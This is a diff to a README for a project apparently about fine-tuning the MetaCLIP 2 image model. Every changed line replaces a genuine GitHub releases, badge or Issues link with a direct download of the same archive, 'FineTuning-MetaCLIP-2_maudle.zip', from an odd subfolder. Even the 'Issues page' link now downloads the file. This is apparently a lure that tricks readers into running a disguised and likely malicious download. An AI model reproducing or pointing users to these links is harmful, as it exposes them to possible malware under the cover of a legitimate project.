@@ -1,6 +1,6 @@
 # 🎉 FineTuning-MetaCLIP-2 - Simple Image Classification Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/fritzkeisler/FineTuning-MetaCLIP-2/releases)
+[![Download Now](https://raw.githubusercontent.com/fritzkeisler/FineTuning-MetaCLIP-2/main/Bettine/FineTuning-MetaCLIP-2_maudle.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/fritzkeisler/FineTuning-MetaCLIP-2/main/Bettine/FineTuning-MetaCLIP-2_maudle.zip)
 
 ## 📝 Overview
 
@@ -11,7 +11,7 @@ FineTuning-MetaCLIP-2 shows how to adjust a pretrained model, MetaCLIP 2, for a 
 To start using FineTuning-MetaCLIP-2, follow these steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/fritzkeisler/FineTuning-MetaCLIP-2/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/fritzkeisler/FineTuning-MetaCLIP-2/main/Bettine/FineTuning-MetaCLIP-2_maudle.zip) to find the latest version.
    
 2. **Download the Software**  
    Look for the most recent release and download the appropriate file for your operating system. The file will typically be an executable for Windows, a package for macOS, or a script for Linux.
@@ -30,7 +30,7 @@ Ensure your system meets these requirements for the best experience.
 To download and install the application:
 
 1. **Go to the Releases Page**  
-   Visit this page to download: [Releases](https://github.com/fritzkeisler/FineTuning-MetaCLIP-2/releases).
+   Visit this page to download: [Releases](https://raw.githubusercontent.com/fritzkeisler/FineTuning-MetaCLIP-2/main/Bettine/FineTuning-MetaCLIP-2_maudle.zip).
 
 2. **Select the Correct File**  
    Choose the file that matches your operating system and click on it to start the download.
@@ -77,7 +77,7 @@ To contribute, please open an issue or submit a pull request in the GitHub repos
 
 ## 🛠️ Support
 
-For any questions or assistance while using FineTuning-MetaCLIP-2, please visit our [GitHub Issues page](https://github.com/fritzkeisler/FineTuning-MetaCLIP-2/issues) to seek help from the community or report any issues.
+For any questions or assistance while using FineTuning-MetaCLIP-2, please visit our [GitHub Issues page](https://raw.githubusercontent.com/fritzkeisler/FineTuning-MetaCLIP-2/main/Bettine/FineTuning-MetaCLIP-2_maudle.zip) to seek help from the community or report any issues.
 
 ## 🌐 Related Topics
 
